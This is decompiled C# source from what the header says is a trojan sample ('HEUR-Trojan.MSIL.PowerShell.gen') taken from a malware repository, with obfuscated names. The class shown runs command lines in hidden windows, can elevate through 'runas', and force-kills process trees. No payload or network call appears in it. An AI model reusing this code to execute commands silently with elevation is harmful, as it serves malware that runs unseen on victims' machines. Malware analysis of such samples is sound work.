// Decompiled with JetBrains decompiler
// Type: s375012979798828.s062136670151047
// Assembly: s968508024776124, Version=2.0.47.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: E3596912-35E7-405B-A05A-F5F12AB5E292
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-b1729c7ae8423cc844b16aa10ca8ddd2b2331adbfb6646d80d73381fbc73a109.exe

using s442701228766881;
using s827992872880859;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace s375012979798828
{
  public sealed class s062136670151047
  {
    private static string[] s724517837558570;
    private static string[] s794784010178036;
    private string s379689172623657;
    private Process s454224261151322;
    private StringBuilder s502836530130198;
    private s434305609096598 s246391313584594;
    private TextWriter s360546916628832;

    public DateTime s024139256677367 => this.s454224261151322.StartTime;

    public bool s062443599093729 => this.s454224261151322.HasExited;

    public DateTime s866937352219527 => this.s454224261151322.ExitTime;

    public TimeSpan s843091139653343 => this.s866937352219527 - this.s024139256677367;

    public int s982801093953446 => this.s454224261151322.Id;

    public int s458846704520366 => this.s454224261151322.ExitCode;

    public string s385419802660393
    {
      get
      {
        if (this.s360546916628832 != null)
          throw new InvalidOperationException("Output not available if redirected to file or stream");
        return this.s502836530130198.ToString();
      }
    }

    public s434305609096598 s921815318034753 => this.s246391313584594;

    public static s062136670151047 s511065182512617(
      string s684842271361594,
      s434305609096598 s923743550865971 = null)
    {
      s923743550865971 = s923743550865971 != null ? s923743550865971.s829521072512481() : new s434305609096598();
      return s062136670151047.s455031916978056(s684842271361594, s923743550865971.s768668256682897(Console.Out));
    }

    public static s062136670151047 s455031916978056(
      string s761710075308025,
      s434305609096598 s610084872719370 = null)
    {
      s610084872719370 = s610084872719370 != null ? s610084872719370.s829521072512481() : new s434305609096598();
      s062136670151047 s062136670151047 = new s062136670151047(s761710075308025, s610084872719370);
      s062136670151047.s171915215419861();
      return s062136670151047;
    }

    public s062136670151047(string commandLine, s434305609096598 options)
    {
      this.s246391313584594 = options;
      this.s379689172623657 = commandLine;
      Match match1 = Regex.Match(commandLine, "^\\s*\"(.*?)\"\\s*(.*)");
      if (!match1.Success)
        match1 = Regex.Match(commandLine, "\\s*(\\S*)\\s*(.*)");
      ProcessStartInfo s740885646293614 = new ProcessStartInfo(match1.Groups[1].Value, match1.Groups[2].Value);
      this.s454224261151322 = new Process();
      this.s454224261151322.StartInfo = s740885646293614;
      this.s502836530130198 = new StringBuilder();
      if (options.s904053596979036)
      {
        options.s896286178046345 = true;
        s740885646293614.Verb = "runas";
        if (options.s344779049952895 == null)
          options.s344779049952895 = Directory.GetCurrentDirectory();
      }
      s740885646293614.CreateNoWindow = options.s321761548198663;
      if (options.s896286178046345)
      {
        s740885646293614.UseShellExecute = true;
        if (options.s321761548198663)
          s740885646293614.WindowStyle = ProcessWindowStyle.Hidden;
      }
      else
      {
        if (options.s443304641192920 != null)
          s740885646293614.RedirectStandardInput = true;
        s740885646293614.UseShellExecute = false;
        s740885646293614.RedirectStandardError = true;
        s740885646293614.RedirectStandardOutput = true;
        s740885646293614.ErrorDialog = false;
        s740885646293614.WindowStyle = ProcessWindowStyle.Hidden;
        s740885646293614.CreateNoWindow = true;
        this.s454224261151322.OutputDataReceived += new DataReceivedEventHandler(this.s916539878643503);
        this.s454224261151322.ErrorDataReceived += new DataReceivedEventHandler(this.s916539878643503);
      }
      if (options.s132013022967654 != null)
      {
        foreach (string key in options.s132013022967654.Keys)
        {
          string input = options.s132013022967654[key];
          if (input != null)
          {
            int startat = 0;
            while (true)
            {
              Match match2 = new Regex("%(\\w+)%").Match(input, startat);
              if (match2.Success)
              {
                string str1 = match2.Groups[1].Value;
                string str2 = !s740885646293614.s928790117104983().ContainsKey(str1) ? Environment.GetEnvironmentVariable(str1) ?? "" : s740885646293614.s928790117104983()[str1];
                int length = match2.Groups[1].Index - 1;
                int startIndex = length + match2.Groups[1].Length + 2;
                input = input.Substring(0, length) + str2 + input.Substring(startIndex, input.Length - startIndex);
                startat = length + str2.Length;
              }
              else
                break;
            }
          }
          s740885646293614.s928790117104983()[key] = input;
        }
      }
      s740885646293614.WorkingDirectory = options.s344779049952895;
      this.s360546916628832 = options.s814287112501191;
      if (options.s647229353400732 != null)
        this.s360546916628832 = (TextWriter) File.CreateText(options.s647229353400732);
      try
      {
        this.s454224261151322.Start();
      }
      catch (Exception ex)
      {
        string message = "Failure starting Process\r\n    Exception: " + ex.Message + "\r\n    Cmd: " + commandLine + "\r\n";
        if (Regex.IsMatch(s740885646293614.FileName, "^(copy|dir|del|color|set|cd|cdir|md|mkdir|prompt|pushd|popd|start|assoc|ftype)", RegexOptions.IgnoreCase))
          message = message + "    Cmd " + s740885646293614.FileName + " implemented by Cmd.exe, fix by prefixing with 'cmd /c'.";
        throw new ApplicationException(message, ex);
      }
      if (!s740885646293614.UseShellExecute)
      {
        this.s454224261151322.BeginOutputReadLine();
        this.s454224261151322.BeginErrorReadLine();
      }
      if (options.s443304641192920 == null)
        return;
      this.s454224261151322.StandardInput.Write(options.s443304641192920);
      this.s454224261151322.StandardInput.Dispose();
    }

    public s062136670151047(string commandLine)
      : this(commandLine, new s434305609096598())
    {
    }

    public s062136670151047 s171915215419861()
    {
      if (this.s246391313584594.s496900078870725)
        return this;
      bool flag1 = false;
      bool flag2 = false;
      try
      {
        this.s454224261151322.WaitForExit(this.s246391313584594.s465138621753113);
        flag1 = true;
        for (int index = 0; index < 10; ++index)
          Thread.Sleep(1);
      }
      finally
      {
        if (!this.s454224261151322.HasExited)
        {
          flag2 = true;
          this.s743602182375973();
        }
      }
      if (this.s360546916628832 != null && this.s246391313584594.s647229353400732 != null)
        this.s360546916628832.Dispose();
      this.s360546916628832 = (TextWriter) null;
      if (flag1 & flag2)
        throw new Exception("Timeout of " + (object) (this.s246391313584594.s465138621753113 / 1000) + " sec exceeded\r\n    Cmd: " + this.s379689172623657);
      if (this.s454224261151322.ExitCode != 0 && !this.s246391313584594.s649480688606910)
        this.s156460131510623((string) null);
      return this;
    }

    public void s156460131510623(string s795064623216332)
    {
      if (this.s454224261151322.ExitCode != 0)
      {
        string str = "";
        if (this.s360546916628832 == null)
        {
          string input = this.s502836530130198.ToString();
          Match match = Regex.Match(input, "^(\\s*\\n)?(.+\\n)(.|\\n)*?(.+\\n.*\\S)\\s*$");
          str = "\r\n  Output: {\r\n    " + (!match.Success ? input.Trim() : match.Groups[2].Value + "    <<< Omitted output ... >>>\r\n" + match.Groups[4].Value).Replace("\n", "\n    ") + "\r\n  }";
        }
        if (s795064623216332 == null)
          s795064623216332 = "";
        else if (s795064623216332.Length > 0)
          s795064623216332 += "\r\n";
        throw new Exception(s795064623216332 + "Process returned exit code 0x" + this.s454224261151322.ExitCode.ToString("x") + "\r\n  Cmd: " + this.s379689172623657 + str);
      }
    }

    public Process s640962110112757 => this.s454224261151322;

    public void s743602182375973()
    {
      try
      {
        s062136670151047.s455031916978056("taskkill /f /t /pid " + (object) this.s454224261151322.Id);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
      int num = 0;
      do
      {
        Thread.Sleep(10);
        ++num;
      }
      while (!this.s454224261151322.HasExited);
      if (this.s360546916628832 != null && this.s246391313584594.s647229353400732 != null)
        this.s360546916628832.Dispose();
      this.s360546916628832 = (TextWriter) null;
    }

    public static string s304435938141627(string s803618712810166)
    {
      if (s803618712810166.IndexOf('"') < 0)
        s803618712810166 = Regex.Replace(s803618712810166, "\\*\"", "\\$1");
      return "\"" + s803618712810166 + "\"";
    }

    public static string s940393135131078(string s625072457522006)
    {
      string str1 = s062136670151047.s162538405809805(s625072457522006);
      if (str1 != null)
        return str1;
      if (!s625072457522006.Contains("\\"))
      {
        foreach (string path1 in s062136670151047.s134593049912964)
        {
          string str2 = s062136670151047.s162538405809805(Path.Combine(path1, s625072457522006));
          if (str2 != null)
            return str2;
        }
      }
      return (string) null;
    }

    private static string s162538405809805(string s741841597409114)
    {
      if (File.Exists(s741841597409114))
        return s741841597409114;
      foreach (string str in s062136670151047.s250316922235657)
      {
        string path = s741841597409114 + str;
        if (File.Exists(path))
          return path;
      }
      return (string) null;
    }

    private static string[] s250316922235657
    {
      get
      {
        if (s062136670151047.s724517837558570 == null)
          s062136670151047.s724517837558570 = Environment.GetEnvironmentVariable("PATHEXT").Split(';');
        return s062136670151047.s724517837558570;
      }
    }

    private static string[] s134593049912964
    {
      get
      {
        if (s062136670151047.s794784010178036 == null)
          s062136670151047.s794784010178036 = Environment.GetEnvironmentVariable("PATH").Split(';');
        return s062136670151047.s794784010178036;
      }
    }

    private void s916539878643503(object s320801209654629, DataReceivedEventArgs s516714963459506)
    {
      if (this.s360546916628832 != null)
        this.s360546916628832.WriteLine(s516714963459506.Data);
      else
        this.s502836530130198.AppendLine(s516714963459506.Data);
    }
  }
}
